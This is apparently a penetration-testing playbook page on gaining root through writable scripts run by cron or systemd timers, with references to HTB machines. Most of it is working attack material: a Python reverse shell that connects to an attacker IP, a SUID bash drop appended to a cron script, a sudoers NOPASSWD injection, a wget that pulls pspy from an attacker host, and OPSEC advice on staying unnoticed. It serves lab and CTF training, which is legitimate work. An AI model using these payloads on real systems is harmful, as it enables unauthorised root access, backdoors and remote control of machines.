# Cron Writable Script Abuse

> A cron job (or systemd timer) executes a script you can write to. Wait
> one cycle and you have whatever uid runs the cron.

## Objective
Achieve the privilege of the cron's executor (typically root) by
modifying a script that the scheduler invokes.

## When To Use
- You have a non-root shell.
- A file owned by you (or with group/world write) sits in a path
  invoked from cron / systemd / scheduled task as another user.

## Detection Indicators
- `/etc/cron.{d,daily,hourly,weekly,monthly}/` entries that point to
  scripts you can write.
- `crontab -l` shows tasks for other users (when run as root).
- File timestamps (e.g., a log) update on a regular cadence.
- `pspy` shows a process spawned by a UID you don't have, on a
  schedule.

## Enumeration Strategy

### Static cron inspection

```bash
ls -la /etc/cron.* 2>/dev/null
cat /etc/crontab
ls -la /var/spool/cron/crontabs/ 2>/dev/null   # per-user crontabs (root-only readable)
```

### Dynamic — pspy

```bash
# upload pspy
wget http://<atk>/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64 -pf -i 1000 | tee /tmp/pspy.log
# wait 60+ seconds; inspect for CMD entries from UID=0
```

### Look for scripts with permissive perms

```bash
find / -path /proc -prune -o -type f \( -perm -o+w -o -perm -g+w \) -print 2>/dev/null \
  | grep -vE "^/(sys|proc|run|dev|tmp)" \
  | head -50
```

### Systemd timers

```bash
systemctl list-timers --all
```

## Exploitation Workflow

1. Identify a writable file invoked from a privileged scheduler.
2. Append a payload (reverse shell, SUID drop, sudoers tampering).
3. Wait for the next execution cycle.
4. Catch the resulting access.

### Reverse shell payload (Python)

```python
import socket, subprocess, os
s = socket.socket(); s.connect(("10.10.14.x", 4445))
os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash","-i"])
```

### SUID drop (more reliable, no listener needed)

```bash
echo 'cp /bin/bash /tmp/.r; chmod +s /tmp/.r' >> /path/to/cron-script.sh
# wait for cron to run
/tmp/.r -p
# id → root (with -p preserves euid)
```

### Sudoers tamper (less stealthy)

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
# only works if the cron writes / appends with root and you redirect carefully
```

## Commands

```bash
# show all cron-equivalent surfaces in one command
( ls -la /etc/cron.{d,daily,hourly,weekly,monthly} 2>/dev/null
  ls -la /etc/cron.d 2>/dev/null
  cat /etc/crontab
  systemctl list-timers --all 2>/dev/null
  for u in $(cut -d: -f1 /etc/passwd); do crontab -u $u -l 2>/dev/null; done ) | less
```

## Tool Usage

- **pspy** — the must-have. Visualises processes started by other users
  without requiring root.
- **`ls -la`** — detect file modifications on a schedule.
- **`stat <file>`** — `Modify` timestamp updates on schedule.

## Common Mistakes

| Mistake | Symptom | Fix |
|---|---|---|
| Modifying a script that's also writable but not invoked | Nothing happens | Confirm scheduled invocation with pspy first |
| Forgetting to wait one full cycle | Premature "doesn't work" | Wait 60-120s |
| Putting payload in a script that crashes | Cron fails silently; payload never runs | Test payload syntax first |
| Reverse shell from cron without nohup | Shell dies when cron exits | Daemonise: `nohup ... &` or use SUID approach |
| Forgetting to clean up | Persistent backdoor | Restore original after capturing root |

## Decision-Making Logic

```
have a non-root shell, no sudo, no SUID, no caps
  └─ pspy for 5 minutes
       └─ see UID=0 spawning a script every minute?
            └─ check perms on that script
                 ├─ writable → drop payload, wait
                 └─ not writable, but in writable dir → name-collision?
                      └─ symlink trick or wildcard injection
```

## Pivot Opportunities
Cron-based privesc usually delivers root directly. Post-root, the
standard post-exploitation flow applies.

## OPSEC Considerations
- The modified script will execute under root and any output is
  visible to root processes / logs.
- A reverse-shell payload running every minute is conspicuous; use
  SUID drop for a one-shot escalation that leaves nothing running.
- Always restore the script after privesc to reduce footprint.

## Real HTB Examples

- **Bashed** — `/scripts/test.py` runs as root every minute,
  scriptmanager owns it.
- **Frolic** — different cron pattern with similar payload approach.
- **Cronos** — cron via DNS-driven config.
- **Postman** — cron-related but different (Redis-driven).
- **Networked** — wildcard cron + tar argument injection.
- **Tartarsauce** — cron + tar + wildcard.

## Alternative Techniques

- **Writable PATH + relative call** — script invoked by name; PATH
  earlier dir is writable; drop a malicious binary there.
- **Writable systemd unit** — same family, modern.
- **`*/1 * * * *` with curl|bash** — when cron pulls remote content;
  hijack DNS or the URL.

## Automation Opportunities

```bash
# pspy-driven monitor
/tmp/pspy64 -pf -i 1000 2>/dev/null | grep -E '^[A-Z]+ UID=0' &
```

## Checklist

- [ ] `pspy` for at least 5 minutes
- [ ] List `/etc/cron.*`, `/etc/crontab`, per-user crontabs
- [ ] Inspect every script invoked by cron for writability
- [ ] Inspect every directory containing such scripts for writability
- [ ] Drop payload (SUID bash preferred)
- [ ] Wait one full cycle, then trigger

## Related Skills

- [`linux-privesc/sudo-gtfobins.md`](sudo-gtfobins.md)
- [`linux-privesc/path-hijacking.md`](path-hijacking.md)
- [`linux-privesc/wildcard-injection.md`](wildcard-injection.md)
- [`tool-usage/pspy.md`](../tool-usage/pspy.md)
- [`methodology/06-linux-attack-flow.md`](../methodology/06-linux-attack-flow.md)
